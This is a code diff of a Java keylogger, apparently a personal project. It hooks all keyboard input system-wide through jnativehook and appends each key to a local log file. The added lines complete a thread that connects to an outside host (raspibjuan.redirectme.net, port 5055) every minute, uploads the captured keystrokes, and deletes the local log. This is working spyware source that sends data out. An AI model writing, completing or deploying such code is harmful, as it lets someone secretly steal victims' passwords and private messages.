@@ -24,25 +24,24 @@ import org.jnativehook.keyboard.NativeKeyListener;
 public class MainKey implements NativeKeyListener {
 	private String aux = "";
 	private static log keylog = new log();
-	
-//C:\Users\EA6259\Documents\juan\Proyectos-JAVA.git\branches\mantenimiento-1\keylogger\.	
+
+	//C:\Users\EA6259\Documents\juan\Proyectos-JAVA.git\branches\mantenimiento-1\keylogger\.	
 	public static void main(String[] args) {
-			
-		
+
+
 		try {
 			GlobalScreen.registerNativeHook();
 		} catch (NativeHookException e) {
-			
+
 			e.printStackTrace();
 		}
-			GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
-			
-			keylog.creaDir();
-			
-			enviaLog logtrx = new enviaLog(keylog.getPath());
-			
-}
-	@Override
+		GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
+		
+		keylog.creaDir();
+		enviaLog logtrx = new enviaLog(keylog.getPath());
+		logtrx.start();
+	}
+
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		aux = NativeKeyEvent.getKeyText(e.getKeyCode());
 		if (!aux.equals("Intro") && !aux.equals("Retroceso") && !aux.equals("Suprimir")){
@@ -54,63 +53,75 @@ public class MainKey implements NativeKeyListener {
 		}
 	}
 
-	@Override
+
 	public void nativeKeyReleased(NativeKeyEvent e) {
-		
+
 	}
 
-	@Override
+
 	public void nativeKeyTyped(NativeKeyEvent e) {
-		
-	}
 
-	
+	}
 
 }
 
 
-
 class enviaLog extends Thread{
 
-	 private String path;	
-	 private FileInputStream fis = null;
-	 private BufferedInputStream bis = null;
-	 private OutputStream os = null;
-	 private ServerSocket servsock = null;
-	 private Socket sock = null;
-	
+	private String path;	
+	private FileInputStream fis = null;
+	private BufferedInputStream bis = null;
+	private OutputStream os = null;
+	private Socket sock = null;
+
 	public enviaLog(String p){
 		path = p;
 	}
 
 	public void run(){
-		
+		System.out.println("thread  1");
 		try{
 			while(true){
-		      sock = new Socket("raspibjuan.redirectme.net", 5055);
-		      File log = new File (path);
-	          byte [] mybytearray  = new byte [(int)log.length()];
-	          fis = new FileInputStream(log);
-	          bis = new BufferedInputStream(fis);
-		     
+				sock = new Socket("raspibjuan.redirectme.net", 5055);
+				File log = new File (path);
+				byte [] mybytearray  = new byte [(int)log.length()];
+				fis = new FileInputStream(log);
+				bis = new BufferedInputStream(fis);
+				bis.read(mybytearray,0,mybytearray.length);
+				os = sock.getOutputStream();
+				os.write(mybytearray,0,mybytearray.length);
+				os.flush();
+				log.delete();
+				try {
+					Thread.sleep(60000);
+				} catch (InterruptedException e) {
+
+				}
 			}
 		}catch(IOException e){
-			
+			System.out.println("No se pudo establecer conexion");
+		}finally{
+			try {
+				if (bis != null)bis.close();
+				if (os != null) os.close();
+				if (sock!=null) sock.close();
+			} catch (IOException e) {
+				e.printStackTrace();
+			}	          
 		}
 	}
-
 }
 
 
 class log{
-	
+
 	private BufferedWriter log;
 	private File fileLog;
 	private static String path = "";
-	
-	
+
+
 	public void creaDir(){
-		
+
 		String appPath = "";
 		File ArchivoLog;
 		appPath = new File(".").getAbsolutePath();
@@ -122,7 +133,7 @@ class log{
 				path += appPath.charAt(i);
 			}
 		}			
-		
+
 		path += "log";
 		//crea carpeta en el directorio
 		ArchivoLog = new File(path);
@@ -130,25 +141,21 @@ class log{
 			ArchivoLog.mkdirs();
 		}
 	}
-	
+
 	public String getPath(){
-		return path;
+		return path + "\\log.txt";
 	}
 
-	
-	
+
 	public void escribir(String s, String path){
-		
+
 		try {
 			log = new BufferedWriter(new FileWriter(path + "\\log.txt",true));
 			log.write(s);
 			log.close();
 		} catch (IOException e) {
-			
+
 			e.printStackTrace();
 		}
-		
-		
 	}
-	
 }
